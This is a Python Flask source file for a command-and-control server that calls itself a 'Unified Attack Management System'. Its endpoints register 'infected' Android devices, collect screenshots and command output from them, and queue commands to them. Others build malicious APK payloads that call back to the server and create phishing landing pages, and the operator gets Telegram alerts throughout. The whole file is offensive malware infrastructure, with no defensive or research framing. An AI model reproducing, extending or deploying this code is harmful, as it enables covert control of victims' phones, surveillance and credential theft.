#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UAMS Backend Flask Application
Unified Attack Management System - REST API Server
Phase 2: Full C2 System with Real Endpoints
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import logging
import sqlite3
import json
import os
from datetime import datetime
import uuid
import threading

# Setup logging
logger = logging.getLogger(__name__)

# Create Flask app
app = Flask(__name__)
app.secret_key = 'UAMS_SECRET_KEY_2024_SECURE'
CORS(app)

# Database path
DATABASE_PATH = "backend/database/cybersec.db"

# Telegram notification function (will be set by main app)
telegram_notifier = None

def set_telegram_notifier(notifier_func):
    """Set the telegram notification function"""
    global telegram_notifier
    telegram_notifier = notifier_func

def get_db_connection():
    """Get database connection"""
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

async def notify_admin(message):
    """Send notification to admin via Telegram"""
    if telegram_notifier:
        try:
            await telegram_notifier(message)
        except Exception as e:
            logger.error(f"Failed to send Telegram notification: {e}")

# ============================================================
# C2 API Endpoints - Phase 2 Core
# ============================================================

@app.route('/api/v1/register', methods=['POST'])
async def register_device():
    """Register new infected device"""
    try:
        data = request.json or {}

        # Generate session ID
        session_id = str(uuid.uuid4())

        # Extract device info
        device_info = {
            'model': data.get('model', 'Unknown'),
            'android_version': data.get('android_version', 'Unknown'),
            'ip_address': request.remote_addr,
            'session_id': session_id,
            'registered_at': datetime.now().isoformat(),
            'status': 'active'
        }

        # Save to database
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO c2_sessions (session_id, ip_address, device_info, status)
                VALUES (?, ?, ?, ?)
            ''', (
                session_id,
                device_info['ip_address'],
                json.dumps(device_info),
                'active'
            ))

            # Log the registration
            cursor.execute('''
                INSERT INTO logs (level, module, message, ip_address)
                VALUES (?, ?, ?, ?)
            ''', (
                'INFO',
                'C2_REGISTER',
                f'New device registered: {device_info["model"]} from {device_info["ip_address"]}',
                device_info['ip_address']
            ))

        # Send Telegram notification
        await notify_admin(f"""
🆕 *NEW DEVICE REGISTERED*

📱 Model: {device_info['model']}
🤖 Android: {device_info['android_version']}
🌐 IP: {device_info['ip_address']}
🆔 Session ID: `{session_id[:8]}...`
⏰ Time: {device_info['registered_at']}
        """.strip())

        logger.info(f"Device registered: {session_id}")
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': 'Device registered successfully'
        })

    except Exception as e:
        logger.error(f"Registration error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/v1/report', methods=['POST'])
async def device_report():
    """Receive reports from infected devices (screenshots, logs, etc.)"""
    try:
        data = request.json or {}
        session_id = data.get('session_id')

        if not session_id:
            return jsonify({'success': False, 'error': 'Missing session_id'}), 400

        # Update device last seen
        with get_db_connection() as conn:
            cursor = conn.cursor()

            # Update session status
            cursor.execute('''
                UPDATE c2_sessions
                SET last_seen = ?, status = 'active'
                WHERE session_id = ?
            ''', (datetime.now(), session_id))

            # Log the report
            report_type = data.get('type', 'unknown')
            cursor.execute('''
                INSERT INTO logs (level, module, message, ip_address)
                VALUES (?, ?, ?, ?)
            ''', (
                'INFO',
                'C2_REPORT',
                f'Device {session_id[:8]}... sent {report_type} report',
                request.remote_addr
            ))

            # If it's a command result, save it
            if report_type == 'command_result':
                command = data.get('command', '')
                result = data.get('result', '')
                success = data.get('success', True)

                cursor.execute('''
                    INSERT INTO commands (session_id, command, result, success)
                    VALUES (?, ?, ?, ?)
                ''', (session_id, command, result, success))

        # Send Telegram notification based on report type
        if data.get('type') == 'screenshot':
            await notify_admin(f"📸 Screenshot received from device `{session_id[:8]}...`")
        elif data.get('type') == 'command_result':
            result = data.get('result', '')[:100]  # Truncate long results
            await notify_admin(f"⚡ Command result from `{session_id[:8]}...`: {result}")
        elif data.get('type') == 'heartbeat':
            pass  # Don't spam for heartbeats
        else:
            await notify_admin(f"📨 Report received from device `{session_id[:8]}...` ({data.get('type', 'unknown')})")

        return jsonify({'success': True, 'message': 'Report received'})

    except Exception as e:
        logger.error(f"Report error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/v1/command/<session_id>', methods=['POST'])
async def send_command_to_device(session_id):
    """Send command to specific device (for future implementation)"""
    try:
        data = request.json or {}
        command = data.get('command', '')

        if not command:
            return jsonify({'success': False, 'error': 'Missing command'}), 400

        # For now, just log the command (in real implementation, this would queue it for the device)
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO commands (session_id, command, result, success)
                VALUES (?, ?, ?, ?)
            ''', (session_id, command, 'Command queued', False))

            cursor.execute('''
                INSERT INTO logs (level, module, message, ip_address)
                VALUES (?, ?, ?, ?)
            ''', (
                'INFO',
                'COMMAND_SENT',
                f'Command sent to {session_id[:8]}...: {command}',
                request.remote_addr
            ))

        await notify_admin(f"⚡ Command queued for device `{session_id[:8]}...`: {command}")

        return jsonify({
            'success': True,
            'session_id': session_id,
            'command': command,
            'message': 'Command queued for execution'
        })

    except Exception as e:
        logger.error(f"Command error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================
# Basic API Endpoints
# ============================================================

@app.route('/')
def index():
    """Main dashboard"""
    return jsonify({
        'status': 'online',
        'framework': 'UAMS',
        'message': 'Unified Attack Management System',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

@app.route('/api/status')
def api_status():
    """Get system status"""
    return jsonify({
        'server_status': 'online',
        'database': 'connected',
        'telegram_bot': 'active',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/payloads', methods=['GET'])
def get_payloads():
    """Get list of payloads"""
    try:
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM payloads ORDER BY created_at DESC')
            payloads = [dict(row) for row in cursor.fetchall()]

        return jsonify({
            'payloads': payloads,
            'count': len(payloads),
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        logger.error(f"Error getting payloads: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/payloads', methods=['POST'])
async def create_payload():
    """Create new payload using template builder"""
    try:
        from builder_engine.template_builder import template_builder

        data = request.json or {}
        server_url = data.get('server_url', f'http://{request.host}')
        app_name = data.get('app_name', 'UAMS_Client')

        # Build APK using template
        result = template_builder.create_template_apk(server_url, 7954796098, app_name)

        if result['success']:
            # Save to database
            with get_db_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO payloads (name, type, ip_address, file_path, status, notes)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    app_name,
                    'apk_template',
                    server_url,
                    result['apk_path'],
                    'active',
                    f'Payload ID: {result["payload_id"]}'
                ))

            # Notify admin
            await notify_admin(f"""
🚀 *NEW PAYLOAD CREATED*

📦 Name: {app_name}
🆔 ID: `{result["payload_id"]}`
🌐 Server: {server_url}
📁 Path: {result["apk_path"]}
⏰ Time: {datetime.now().isoformat()}
            """.strip())

            return jsonify({
                'success': True,
                'payload_id': result['payload_id'],
                'apk_path': result['apk_path'],
                'download_url': result['download_url'],
                'message': 'Payload created successfully'
            })
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')}), 500

    except Exception as e:
        logger.error(f"Error creating payload: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions')
def get_c2_sessions():
    """Get C2 sessions"""
    try:
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM c2_sessions WHERE status = "active" ORDER BY connected_at DESC')
            sessions = []
            for row in cursor.fetchall():
                session_data = dict(row)
                # Parse device_info JSON
                if session_data.get('device_info'):
                    try:
                        session_data['device_info'] = json.loads(session_data['device_info'])
                    except:
                        session_data['device_info'] = {}
                sessions.append(session_data)

        return jsonify({
            'sessions': sessions,
            'active_count': len(sessions),
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        logger.error(f"Error getting sessions: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions/<session_id>/command', methods=['POST'])
def send_command(session_id):
    """Send command to C2 session"""
    try:
        data = request.json or {}
        command = data.get('command', '')

        if not command:
            return jsonify({'success': False, 'error': 'Missing command'}), 400

        # Send command via the new endpoint
        return send_command_to_device(session_id)

    except Exception as e:
        logger.error(f"Error sending command: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/phishing', methods=['POST'])
def create_phishing_page():
    """Create phishing page"""
    try:
        data = request.json or {}
        template = data.get('template', 'google_drive')
        payload_id = data.get('payload_id')

        # Create phishing page (placeholder for now)
        page_id = str(uuid.uuid4())[:8]
        page_url = f"/phish/{template}_{page_id}.html"

        # Save to database
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO landing_pages (name, template, payload_id, url_path)
                VALUES (?, ?, ?, ?)
            ''', (
                f"{template}_{page_id}",
                template,
                payload_id,
                page_url
            ))

        notify_admin(f"🎭 Phishing page created: {template} -> {page_url}")

        return jsonify({
            'success': True,
            'page_id': page_id,
            'template': template,
            'url': f"http://{request.host}{page_url}",
            'message': 'Phishing page created successfully'
        })

    except Exception as e:
        logger.error(f"Error creating phishing page: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/download/<filename>')
def download_file(filename):
    """Download generated files"""
    try:
        file_path = os.path.join('payloads', filename)
        if os.path.exists(file_path):
            return send_file(file_path, as_attachment=True)
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/config')
def get_config():
    """Get system configuration"""
    return jsonify({
        'server_host': '0.0.0.0',
        'server_port': 5000,
        'database': 'cybersec.db',
        'telegram_bot': 'enabled',
        'admin_id': 7954796098
    })

# ============================================================
# Error Handlers
# ============================================================

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not found', 'status': 404}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error', 'status': 500}), 500

if __name__ == '__main__':
    logger.info("Starting UAMS Backend API Server...")
    app.run(host='0.0.0.0', port=5000, debug=False)